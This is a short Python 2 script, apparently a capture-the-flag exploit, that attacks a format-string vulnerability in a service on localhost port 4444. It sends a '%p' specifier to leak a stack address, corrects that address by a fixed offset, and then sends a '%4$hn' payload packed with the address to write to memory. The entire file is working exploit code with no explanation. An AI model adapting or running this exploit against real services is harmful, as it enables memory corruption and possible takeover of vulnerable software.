import socket 
import time
from struct import pack
import re

recover = 0x7fff405f90a0 - 8 - 0x7fff405f69b0
reStr = '0x.{12}'
rex = re.compile(reStr)
s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(('localhost',4444))
raw_input('debug')
print s.recv(1024)
s.send('a'*200+'b'*200+'c'*200+'%p'+'\n')
print s.recv(1024)
buf =  s.recv(4000)

print buf 
addr = rex.findall(buf)[0]
addr = int(addr,16)
print 'debug:',hex(addr)
addr = addr + recover
print 'after recover:',hex(addr)
print s.recv(1024)

s.send('%4$hnaaa'+'aaaaaaaa'+pack('L',addr))
print s.recv(1024)
print s.recv(1024)
